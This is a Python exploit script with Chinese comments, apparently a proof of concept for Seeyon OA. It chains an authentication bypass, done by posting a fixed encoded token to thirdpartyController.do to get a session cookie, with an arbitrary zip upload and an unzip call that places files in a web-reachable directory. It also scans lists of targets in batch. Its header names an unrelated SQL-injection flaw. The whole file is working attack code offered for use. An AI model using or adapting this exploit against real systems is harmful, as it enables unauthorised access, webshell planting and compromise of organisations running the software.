'''
Author: your name
Date: 2021-04-08 14:08:20
LastEditTime: 2021-04-11 04:15:12
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \360天擎-前台sql注入\poc.py
'''
import json
import requests
import time
import re
import os
from requests.api import request
from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse


class poc():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:致远OA任意用户登录+文件上传  
功能：单个检测、利用；批量检测                                     
单个检测：python poc.py -u url
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')

    #漏洞检测,获取cookie
    def get_cookies(self, target_url, session):
        url = f"{target_url.rstrip('/')}/seeyon/thirdpartyController.do"
        data = {
            "method": "access",
            "enc":
            "TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4",
            "clientPath": "127.0.0.1"
        }
        session.headers[
            'User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        try:
            res = session.post(url=url, data=data, verify=False, timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    #文件上传
    def upload(self, target_url, session):
        url = f"{target_url.rstrip('/')}/seeyon/fileUpload.do?method=processUpload"
        file = input('[+] 请输入需要上传的文件路径(默认为脚本目录下的test.zip)： ') or 'test.zip'
        files = {'file': open(file, 'rb')}
        try:
            upload_res = session.post(url=url,
                                      files=files,
                                      timeout=10,
                                      verify=False)
            return upload_res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    #文件解压
    def upzip(self, target_url, session, fileurls):
        url = f"{target_url.rstrip('/')}/seeyon/ajax.do"
        session.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        times = time.strftime('%Y-%m-%d')
        data = {
            "method": "ajaxAction",
            "managerName": "portalDesignerManager",
            "managerMethod": "uploadPageLayoutAttachment",
            "arguments": f'[0,"{times}","{fileurls}"]'
        }
        try:
            upzip_res = session.post(url=url,
                                     data=data,
                                     timeout=10,
                                     verify=False)
            return upzip_res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    def main(self, target_url, file):
        session = requests.session()
        self.title()
        count = 0
        if target_url:
            #获取cookies
            res = self.get_cookies(target_url, session)
            if res.status_code == 200 and 'Set-Cookie' in res.headers:
                cookies = res.headers['Set-Cookie'].split(';')[0]
                print(f'[+] 获取到的cookies: {cookies}')
                #给会话增加cookies
                session.headers['Cookie'] = cookies
                choose=input('[+] 是否进行文件上传利用，是请输入 1，否则输入其他退出：')
                if choose == str(1):
                    upload_res = self.upload(target_url, session)
                    if upload_res.status_code==200 and upload_res.text:
                        fileurls = re.findall('fileurls=fileurls\+","\+\'(.+)\'',
                                            upload_res.text, re.I)[0]
                        print(f'[+] 获取到的文件ID: {fileurls}')
                        upzip_res = self.upzip(target_url, session, fileurls)
                        if upzip_res.status_code == 500 and ('Error on' in upzip_res.text):
                            print('[+] 文件上传成功')
                            print(
                                f'[+] 路径为：{target_url}/seeyon/common/designer/pageLayout/文件名'
                            )
        if file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                res = self.get_cookies(target_url, session)
                if res.status_code == 200 and 'Set-Cookie' in res.headers:
                    cookies = res.headers['Set-Cookie'].split(';')[0]
                    print(
                        f'[{count}] {target_url}存在可能漏洞，获取到的cookies: {cookies}')
                else:
                    print(f'[{count}] {target_url}不存在漏洞')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = poc()
    run.main(args.url, args.file)
